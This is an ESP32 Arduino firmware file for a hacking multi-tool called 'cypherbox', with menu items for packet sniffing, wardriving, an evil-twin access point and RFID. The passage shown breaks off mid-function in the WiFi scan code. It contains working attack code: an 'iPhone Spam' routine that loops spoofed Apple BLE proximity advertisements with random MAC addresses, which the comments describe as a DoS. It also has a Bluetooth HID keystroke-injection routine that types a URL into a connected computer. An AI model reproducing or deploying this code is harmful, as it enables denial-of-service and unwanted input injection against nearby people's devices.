
#include "freertos/FreeRTOS.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_event_loop.h"
#include "nvs_flash.h"
#include "driver/gpio.h"
#include "esp_event_loop.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Adafruit_NeoPixel.h>
#include <U8g2_for_Adafruit_GFX.h>
// BT
#include <BluetoothSerial.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BleKeyboard.h>
#include <BLEServer.h>
// WIFI
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
//Packet Sniffer
#include <stdio.h>
#include <string>
#include <cstddef>
#include <Preferences.h>
#include "FS.h"
#include "SD_MMC.h"
#include "Buffer.h"
// RFID
#include <MFRC522.h>
#include <SPI.h>
// GPS
#include <TinyGPSPlus.h>
#include <HardwareSerial.h>
#include <time.h>
#include <RTClib.h>
#include <SD.h>

// STATE MANAGEMENT
enum AppState
{
  STATE_MENU,
  STATE_PACKET_MON,
  STATE_WIFI_SNIFFER,
  STATE_AP_SCAN,
  STATE_AP_JOIN,
  STATE_AP_CREATE,
  STATE_STOP_AP,
  STATE_STOP_SERVER,
  STATE_BT_SCAN,
  STATE_BT_SERIAL,
  STATE_BT_HID,
  STATE_IPHONE_SPAM,
  STATE_DEVIL_TWIN,
  STATE_RFID,
  STATE_WARDRIVER,
};
// Global variable to keep track of the current state
AppState currentState = STATE_MENU;

// VARIABLES
enum MenuItem
{
  PACKET_MON,
  WIFI_SNIFF,
  AP_SCAN,
  AP_JOIN,
  AP_CREATE,
  STOP_AP,
  STOP_SERVER,
  BT_SCAN,
  BT_CREATE,
  BT_SERIAL_CMD,
  BT_HID,
  IPHONE_SPAM,
  // BEACON_SWARM,
  DEVIL_TWIN,
  RFID,
  WARDRIVER,
  // RF_SCAN,
  PARTY_LIGHT,
  LIGHTOFF,
  FILES,
  // ESPEE_BOT, // needs reworking
  // DEAUTH,
  // GAMES, // needs implementation
  SETTINGS,
  HELP,
  NUM_MENU_ITEMS
};

/*

enum WifiItem
{
  AP_SCAN,
  AP_JOIN,
  AP_CREATE,
  STOP_AP,
  STOP_SERVER
};
enum BluetoothItem
{
  BT_SCAN,
  BT_CREATE,
  BT_SERIAL_CMD,
  BT_HID,
  IPHONE_SPAM
};
enum RfidItem
{
  READ,
  WRITE,
  ERASE
};
*/
// volatile bool stopSniffer = false; // Flag to stop the sniffer
volatile bool snifferRunning = true;
const int MAX_VISIBLE_MENU_ITEMS = 3; // Maximum number of items visible on the screen at a time
MenuItem selectedMenuItem = PACKET_MON;
int firstVisibleMenuItem = 0;

// ***FOR YELLOW/BLUE SSD1306 SCREEN***Adjust the constants and initialization as needed
#define YELLOW_HEIGHT 16
#define BLUE_HEIGHT (SCREEN_HEIGHT - YELLOW_HEIGHT)

// U8g2 for Adafruit GFX
U8G2_FOR_ADAFRUIT_GFX u8g2_for_adafruit_gfx;
// Screen Setup
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
// *** PINS ***
#define NEOPIXEL_PIN 26
Adafruit_NeoPixel strip = Adafruit_NeoPixel(1, NEOPIXEL_PIN, NEO_RGB + NEO_KHZ800);
// LED
#define LED_PIN 19
// Buttons
#define UP_BUTTON_PIN 34
#define DOWN_BUTTON_PIN 35
#define SELECT_BUTTON_PIN 15
#define HOME_BUTTON_PIN 2

//PACKET MONITOR SETTINGS
#define MAX_CH 14       // 1 - 14 channels (1-11 for US, 1-13 for EU and 1-14 for Japan)
#define SNAP_LEN 2324   // max len of each recieved packet
#define BUTTON_PIN 15
#define USE_DISPLAY     // comment out if you don't want to use the OLED display
#define FLIP_DISPLAY    // comment out if you don't like to flip it
#define SDA_PIN 21
#define SCL_PIN 22
#define MAX_X 128
#define MAX_Y 51
#if CONFIG_FREERTOS_UNICORE
#define RUNNING_CORE 0
#else
#define RUNNING_CORE 1
#endif
#ifdef USE_DISPLAY
//#include "SH1106.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
// Include the font library if you're using custom fonts
#include <Fonts/FreeMonoBold9pt7b.h> 
#endif
Buffer sdBuffer;
using namespace std;
Preferences preferences;
bool useSD = false;
bool buttonPressed = false;
bool buttonEnabled = true;
uint32_t lastDrawTime;
uint32_t lastButtonTime;
uint32_t tmpPacketCounter;
uint32_t pkts[MAX_X];       // here the packets per second will be saved
uint32_t deauths = 0;       // deauth frames per second
unsigned int ch = 1;        // current 802.11 channel
int rssiSum;

// TASKS
TaskHandle_t iphoneSpamTask;

// *** DISPLAY
void initDisplay()
{
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C))
  { // Address 0x3C for 128x64
    Serial.println(F("SSD1306 allocation failed"));
    for (;;)
      ;
  }
  display.display();
  delay(2000);
  display.clearDisplay();
}

void drawMenu()
{
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.fillRect(0, 0, SCREEN_WIDTH, YELLOW_HEIGHT, SSD1306_WHITE); // Fill the top 16px with white (yellow on your screen)
  display.setTextColor(SSD1306_BLACK);                                // Black text in yellow area
  display.setCursor(5, 4);                                            // Adjust as needed
  display.setTextSize(1);
  display.println("Home"); // Replace with dynamic title if needed
  const char *menuLabels[NUM_MENU_ITEMS] = {"Packet Monitor", "Wifi Sniff", "AP Scan", "AP Join", "AP Create", "Stop AP", "Stop Server", "BT Scan", "BT Create", "BT Ser. CMD", "BT HID", "iPhone Spam", "Devil Twin", "RFID Read", "Wardriver", "Party Light", "Light Off", "Files", "Settings", "Help"};
  // Display the menu items in the blue area
  display.setTextColor(SSD1306_WHITE); // White text in blue area
  for (int i = 0; i < 2; i++)
  { // Only show 2 menu items at a time
    int menuIndex = (firstVisibleMenuItem + i) % NUM_MENU_ITEMS;
    int16_t x = 5;
    int16_t y = YELLOW_HEIGHT + 12 + (i * 20); // Adjust vertical spacing and offset as needed

    // Highlight the selected item
    if (selectedMenuItem == menuIndex)
    {
      display.fillRect(0, y - 2, SCREEN_WIDTH, 15, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK); // Black text for highlighted item
    }
    else
    {
      display.setTextColor(SSD1306_WHITE); // White text for other items
    }
    display.setCursor(x, y);
    display.setTextSize(1);
    display.println(menuLabels[menuIndex]);
  }
  display.display();
  updateNeoPixel();
}

// *** BLUETOOTH MODULES ***
//  BT SCANNER   //
// Bluetooth Classic settings
BluetoothSerial SerialBT;
// BLE settings
BLEScan *pBLEScan;
int scanTime = 5; // BLE scan time in seconds
// BLE Advertised Device Callbacks
class MyAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks
{
  void onResult(BLEAdvertisedDevice advertisedDevice)
  {
    String deviceInfo = String("BLE Device found: ") + advertisedDevice.toString().c_str();
    Serial.println(deviceInfo);
    display.println(deviceInfo);
    delay(200);
  }
};
void initBTScan()
{
  // Initialize BLE
  BLEDevice::init("");
  pBLEScan = BLEDevice::getScan(); // Create new scan
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true); // Active scan uses more power, but gets results faster
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99); // Less or equal setInterval value
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_adventurer_tr); // Use a larger font for the title
  u8g2_for_adafruit_gfx.setCursor(20, 40);                // Centered vertically
  u8g2_for_adafruit_gfx.print("LOADING...");
  display.display();
  delay(2000);
}
void runBTScan()
{
  // Scan for BLE devices
  BLEScanResults *foundDevices = pBLEScan->start(scanTime, false);
  int bleDeviceCount = foundDevices->getCount();
  Serial.print("BLE Devices found: ");
  Serial.println(bleDeviceCount);
  // Start displaying Bluetooth devices from line 5
  int y = 5;
  // Display/print details of the most recent 5 Bluetooth devices found
  int numDevicesToDisplay = min(5, bleDeviceCount); // Ensure we don't try to display more devices than were found
  for (int i = bleDeviceCount - numDevicesToDisplay; i < bleDeviceCount; i++)
  {
    BLEAdvertisedDevice device = foundDevices->getDevice(i);
    String deviceInfo = "Latest BT Device:\n" + String(device.getAddress().toString().c_str());
    deviceInfo += "\nRSSI: " + String(device.getRSSI());
    // Add more information as needed
    Serial.println(deviceInfo);
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.print(deviceInfo + "\nBLE Devices: " + String(bleDeviceCount));
    display.display();
    delay(2000); // Display each device info for 2 seconds
  }
  delay(10000); // Wait before scanning again
}
void cleanupBTScan()
{
  // Stop BLE scan
  if (pBLEScan)
  {
    pBLEScan->stop();
    delete pBLEScan;    // Deallocate BLEScan
    pBLEScan = nullptr; // Avoid dangling pointer
  }
  BLEDevice::deinit();
}
// END BT SCANNER //

// BT SERIAL COMMANDS //
// variables
BleKeyboard bleKeyboard("cypherbox", "cypher", 100);
bool bluetoothActive = true;
String BTssid = "";
String BTpassword = "";
void initBTSerialDisplay()
{
  display.clearDisplay();
  u8g2_for_adafruit_gfx.begin(display);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_baby_tf);
  const char *commands[] = {
      "Available commands:",
      "WIFI \"ssid for spaced named\"",
      "PASS password",
      "START_WIFI",
      "STOP_WIFI",
      "SCAN_WIFI",
      "BT_SCAN",
      "STOP_BT"};
  for (int i = 0; i < 8; i++)
  {
    u8g2_for_adafruit_gfx.setCursor(0, i * 8);
    u8g2_for_adafruit_gfx.print(commands[i]);
  }
  display.display();
}

void initBTSerial()
{
  // Initialize Bluetooth
  if (!SerialBT.begin("cookiemangos"))
  {
    Serial.println("An error occurred initializing Bluetooth");
  }
  else
  {
    Serial.println("Bluetooth initialized");
  }
}
void runBTSerial()
{
  // Check if data is available on Bluetooth
  if (SerialBT.available())
  {
    String command = SerialBT.readStringUntil('\n');
    command.trim(); // Remove any leading/trailing whitespace
    handleCommand(command);
  }
}
void handleCommand(String command)
{
  Serial.println("Command received: " + command);
  SerialBT.println("Command received: " + command);
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setCursor(0, 0);
  u8g2_for_adafruit_gfx.print("Cmd: " + command);
  display.display();

  if (command.startsWith("WIFI "))
  {
    int firstQuote = command.indexOf('"');
    int secondQuote = command.indexOf('"', firstQuote + 1);

    if (firstQuote != -1 && secondQuote != -1)
    {
      BTssid = command.substring(firstQuote + 1, secondQuote);
      SerialBT.println("SSID set to: " + BTssid);
      Serial.println("SSID set to: " + BTssid);
      u8g2_for_adafruit_gfx.setCursor(0, 8);
      u8g2_for_adafruit_gfx.print("SSID set: " + BTssid);
      display.display();
    }
    else
    {
      SerialBT.println("Invalid WIFI command format. Use: WIFI \"ssid for spaced named\"");
      Serial.println("Invalid WIFI command format. Use: WIFI \"ssid for spaced named\"");
    }
  }
  else if (command.startsWith("PASS "))
  {
    BTpassword = command.substring(5);
    SerialBT.println("Password set to: " + BTpassword);
    Serial.println("Password set to: " + BTpassword);
    u8g2_for_adafruit_gfx.setCursor(0, 8);
    u8g2_for_adafruit_gfx.print("Password set");
    display.display();
  }
  else if (command == "START_WIFI")
  {
    startWiFi();
  }
  else if (command == "STOP_WIFI")
  {
    stopWiFi();
  }
  else if (command == "SCAN_WIFI")
  {
    // scanWiFiNetworks();
  }
  else if (command == "BT_SCAN")
  {
    runBTScan();
  }
  else if (command == "BT_HID")
  {
    SerialBT.println("BT_HID command selected....");
    Serial.println("BT_HID command selected....");
    u8g2_for_adafruit_gfx.setCursor(0, 8);
    u8g2_for_adafruit_gfx.print("BT HID Selected.");
    // blueHID();
  }
  else if (command == "STOP_BT")
  {
    stopBluetooth();
  }
  else if (command == "CREATE_AP")
  {
    SerialBT.println("CREATE_AP command received, but not implemented yet.");
  }
  else
  {
    SerialBT.println("Unknown command: " + command);
    Serial.println("Unknown command: " + command);
  }
}

void startWiFi()
{
  if (BTssid == "" || BTpassword == "")
  {
    SerialBT.println("SSID or Password not set. Use WIFI and PASS commands first.");
    Serial.println("SSID or Password not set. Use WIFI and PASS commands first.");
    u8g2_for_adafruit_gfx.setCursor(0, 16);
    u8g2_for_adafruit_gfx.print("SSID/PASS not set");
    display.display();
    return;
  }

  WiFi.begin(BTssid.c_str(), BTpassword.c_str());
  SerialBT.println("Connecting to WiFi...");
  Serial.println("Connecting to WiFi...");
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setCursor(0, 0);
  u8g2_for_adafruit_gfx.print("Connecting...");
  display.display();

  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20)
  { // Maximum of 20 attempts
    delay(500);
    SerialBT.print(".");
    Serial.print(".");
    attempts++;
  }

  if (WiFi.status() == WL_CONNECTED)
  {
    SerialBT.println("\nConnected to WiFi!");
    SerialBT.print("IP Address: ");
    SerialBT.println(WiFi.localIP());
    Serial.println("\nConnected to WiFi!");
    Serial.print("IP Address: ");
    Serial.println(WiFi.localIP());
    display.clearDisplay();
    u8g2_for_adafruit_gfx.setCursor(0, 0);
    u8g2_for_adafruit_gfx.print("Connected: ");
    u8g2_for_adafruit_gfx.print(WiFi.localIP());
    display.display();
  }
  else
  {
    SerialBT.println("\nFailed to connect to WiFi");
    Serial.println("\nFailed to connect to WiFi");
    u8g2_for_adafruit_gfx.setCursor(0, 24);
    u8g2_for_adafruit_gfx.print("Failed to connect");
    display.display();
  }
}

// Stop WiFi connection
void stopWiFi()
{
  WiFi.disconnect();
  SerialBT.println("WiFi disconnected");
  Serial.println("WiFi disconnected");
  u8g2_for_adafruit_gfx.setCursor(0, 0);
  u8g2_for_adafruit_gfx.print("WiFi disconnected");
  display.display();
}
void stopBluetooth()
{
  SerialBT.end();
  SerialBT.println("Bluetooth stopped");
  Serial.println("Bluetooth stopped");
  u8g2_for_adafruit_gfx.setCursor(0, 0);
  u8g2_for_adafruit_gfx.print("BT stopped");
  display.display();
}

// END BT SERIAL COMMANDS //

// BT HID START //

void initBTHid()
{
  bleKeyboard.begin();
  Serial.println("Bluetooth HID initialized");
  delay(3000);
}

void runBTHid()
{
  if (bleKeyboard.isConnected())
  {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);
    display.setCursor(0, 0);
    display.println("Starting Rick Roll Hack....!!!");
    Serial.println("Starting Rick Roll Hack....!!!");
    delay(1000);
    display.display();
    // Open browser home page
    bleKeyboard.write(KEY_MEDIA_WWW_HOME);
    delay(6000);
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("Opening Rick Roll Hack....");
    Serial.println("Opening Rick Roll Hack....");
    display.display();
    // URL to open
    const char *url = "https://youtu.be/oHg5SJYRHA0?si=bfXXjVeR5UyKoh4n";

    // Type the URL with a small delay between each character
    for (size_t i = 0; i < strlen(url); i++)
    {
      bleKeyboard.write(url[i]);
      delay(50); // Adjust this delay if needed
    }
    delay(500); // Small delay before pressing enter
    bleKeyboard.press(KEY_RETURN);
    bleKeyboard.releaseAll();
    delay(10000); // Adjust this delay according to Chrome's load time
    display.setCursor(0, 12);
    display.println("Hack complete....!");
    Serial.println("Hack complete....!");
    display.display();
    delay(1000);
    display.setCursor(0, 24);
    display.println("BT HID Complete....");
    Serial.println("BT HID Complete....");
    delay(2000);
    display.display();

    delay(1000);
  }

  Serial.println("Waiting 5 seconds to connect...");
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("Waiting 5 seconds to connect...");
  display.display();
  delay(5000);
}
// END BT HID //

// START IPHONE SPAM //
// DEVICE VARIABLES //
const uint8_t DEVICES[][31] = {
    /*
      These are audio devices: wireless headphones / earbuds
      It seems these need a shorter range between ESP & iDevice
    */
    // Airpods
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Airpods Pro
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Airpods Max
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Airpods Gen 2
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Airpods Gen 3
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Airpods Pro Gen 2
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Power Beats
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Power Beats Pro
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Solo Pro
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Studio Buds
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Flex
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats X
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Solo 3
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Studio 3
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Studio Pro
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Betas Fit Pro
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Studio Buds Plus
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};
const uint8_t SHORT_DEVICES[][23] = {
    /*
      These are more general home devices
      It seems these can work over long distances, especially AppleTV Setup
    */
    // AppleTV Setup
    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    // AppleTV Pair
    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    // AppleTV New User
    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    // AppleTV AppleID Setup
    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    // AppleTV Wireless Audio Sync
    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    // AppleTV Homekit Setup
    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    // AppleTV Keyboard Setup
    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    // AppleTV Connecting to Network
    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    // Homepod Setup
    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    // Setup New Phone
    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    // Transfer Number
    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    // TV Color Balance
    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    // Vision Pro
    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
};

BLEAdvertising *pAdvertising; // global variable
uint32_t delayMilliseconds = 5000;
void initIphoneSpam()
{
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_baby_tf); // Set to a small font
  u8g2_for_adafruit_gfx.setCursor(0, 10);
  u8g2_for_adafruit_gfx.print("Running iPhone Spam...");
  u8g2_for_adafruit_gfx.setCursor(0, 30);
  u8g2_for_adafruit_gfx.print("Restart Phone to Stop...");
  display.display();
  BLEDevice::init("AirPods 69");
  delay(3000);

  // Increase BLE Power to 9dBm (MAX)
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

  // Create the BLE Server
  BLEServer *pServer = BLEDevice::createServer();
  Serial.println("Creating BT server");
  delay(3000);
  pAdvertising = pServer->getAdvertising();
  delay(1000);

  // seems we need to init it with an address in setup() step.
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
  delay(2000);
}

void runIphoneSpam()
{
  while (true)
  {
    // First generate fake random MAC
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++)
    {
      dummy_addr[i] = random(256);

      // It seems for some reason first 4 bits
      // Need to be high (aka 0b1111), so we
      // OR with 0xF0
      // if (i == 0){
      // dummy_addr[i] |= 0xF0;
      //}
    }

    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

    // Randomly pick data from one of the devices
    // First decide short or long
    // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
    int device_choice = random(2);
    // int device_choice = 1;

    if (device_choice == 0)
    {
      int index = random(17);
      oAdvertisementData.addData(String((char *)DEVICES[index]));
    }
    else
    {
      int index = random(13);
      oAdvertisementData.addData(String((char *)SHORT_DEVICES[index]));
    }
    /*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
      the three advertising PDU types when you want to connect to Apple devices.
          // 0 = ADV_TYPE_IND,
          // 1 = ADV_TYPE_SCAN_IND
          // 2 = ADV_TYPE_NONCONN_IND
      Randomly using any of these PDU types may increase detectability of spoofed packets.
      What we know for sure:
      - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
                        Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
  */
    int adv_type_choice = random(3);
    if (adv_type_choice == 0)
    {
      pAdvertising->setAdvertisementType(ADV_TYPE_IND);
    }
    else if (adv_type_choice == 1)
    {
      pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    }
    else
    {
      pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    }
    // Set the device address, advertisement data
    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    pAdvertising->setAdvertisementData(oAdvertisementData);
    // Set advertising interval
    /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
      an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.

      These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
  */
    // pAdvertising->setMinInterval(0x20);
    // pAdvertising->setMaxInterval(0x20);
    // pAdvertising->setMinPreferred(0x20);
    // pAdvertising->setMaxPreferred(0x20);
    //  Start advertising
    Serial.println("Sending Advertisement...");
    pAdvertising->start();
    delay(delayMilliseconds); // delay for delayMilliseconds ms
    pAdvertising->stop();
  }
}
// *** WIFI MODULES ***

// Network data structure
struct _Network
{
  String ssid;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t encryptionType;
  uint8_t ch;
};

_Network _networks[16]; // Adjust size as needed
void clearArray()
{
  for (int i = 0; i < 16; ++i)
  {
    _networks[i].ssid = "";
    memset(_networks[i].bssid, 0, sizeof(_networks[i].bssid));
    _networks[i].rssi = 0;
    _networks[i].encryptionType = 0;
    _networks[i].ch = 0;
  }
}

void performScan()
{
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_adventurer_tr); // Use a larger font for the title
  u8g2_for_adafruit_gfx.setCursor(20, 40);                // Centered vertically
  u8g2_for_adafruit_gfx.print("LOADING...");
  display.display();
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0)
  {
    Serial.println("Scanned Networks:");
    for (int i = 0; i < n && i < 16; ++i)
    {
      _Network network;
      network.ssid = WiFi.SSID(i);
      Serial.print("SSID: ");
